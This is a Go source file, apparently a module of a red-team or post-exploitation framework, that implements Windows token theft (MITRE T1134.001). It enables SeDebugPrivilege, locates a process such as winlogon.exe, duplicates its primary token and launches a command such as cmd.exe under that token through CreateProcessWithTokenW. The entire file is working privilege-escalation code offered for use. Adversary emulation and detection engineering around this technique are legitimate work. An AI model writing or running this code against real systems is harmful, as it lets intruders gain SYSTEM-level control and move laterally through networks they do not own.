// Package tokens provides token-stealing primitives for privilege
// escalation and lateral pivoting.
package tokens

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32                    = syscall.NewLazyDLL("advapi32.dll")
	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
)

const (
	sePrivilegeEnabled    = 0x00000002
	tokenDuplicate        = 0x0002
	tokenQuery            = 0x0008
	tokenAdjustPrivileges = 0x0020
	securityImpersonation = 2
	tokenPrimary          = 1
	maximumAllowed        = 0x02000000
)

// Steal duplicates a primary token from another process and spawns SpawnExe
// under it via CreateProcessWithTokenW.  MITRE T1134.001.
//
// Requires SeImpersonatePrivilege (Administrators by default) and
// SeDebugPrivilege when reaching across to SYSTEM processes - set
// EnableSeDebug to enable it programmatically.
type Steal struct {
	TargetExe     string // process to steal from, e.g. "winlogon.exe"
	SpawnExe      string // command line to launch, e.g. "C:\Windows\System32\cmd.exe"
	EnableSeDebug bool
}

func (s *Steal) Name() string  { return "token-impersonation" }
func (s *Steal) MITRE() string { return "T1134.001" }

func (s *Steal) Run() error {
	if s.TargetExe == "" || s.SpawnExe == "" {
		return fmt.Errorf("TargetExe and SpawnExe are required")
	}
	if s.EnableSeDebug {
		if err := EnableSeDebug(); err != nil {
			return fmt.Errorf("enable SeDebug: %w", err)
		}
	}
	pid, err := FindPID(s.TargetExe)
	if err != nil {
		return err
	}
	return stealAndSpawn(pid, s.SpawnExe)
}

// EnableSeDebug elevates the current process token with SeDebugPrivilege.
// Exported so other packages can reuse it without depending on Steal.
func EnableSeDebug() error {
	var token windows.Token
	if err := windows.OpenProcessToken(
		windows.CurrentProcess(),
		tokenAdjustPrivileges|tokenQuery,
		&token,
	); err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer token.Close()

	var luid windows.LUID
	name, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	if err := windows.LookupPrivilegeValue(nil, name, &luid); err != nil {
		return fmt.Errorf("LookupPrivilegeValue: %w", err)
	}

	var tp windows.Tokenprivileges
	tp.PrivilegeCount = 1
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = sePrivilegeEnabled

	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}

// FindPID returns the PID of the first process matching exeName (case-insensitive).
func FindPID(exeName string) (uint32, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return 0, err
	}
	for {
		if strings.EqualFold(windows.UTF16ToString(pe.ExeFile[:]), exeName) {
			return pe.ProcessID, nil
		}
		if err := windows.Process32Next(snap, &pe); err != nil {
			return 0, fmt.Errorf("process %q not found", exeName)
		}
	}
}

func stealAndSpawn(targetPID uint32, cmdLine string) error {
	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, targetPID)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", targetPID, err)
	}
	defer windows.CloseHandle(proc)

	var srcToken windows.Token
	if err := windows.OpenProcessToken(proc, tokenDuplicate|tokenQuery, &srcToken); err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer srcToken.Close()

	var dupToken windows.Token
	if err := windows.DuplicateTokenEx(
		srcToken, maximumAllowed, nil,
		securityImpersonation, tokenPrimary, &dupToken,
	); err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer dupToken.Close()

	cmdW, _ := syscall.UTF16PtrFromString(cmdLine)
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	ret, _, callErr := procCreateProcessWithTokenW.Call(
		uintptr(dupToken),
		0, 0,
		uintptr(unsafe.Pointer(cmdW)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcessWithTokenW: %w", callErr)
	}
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)
	return nil
}
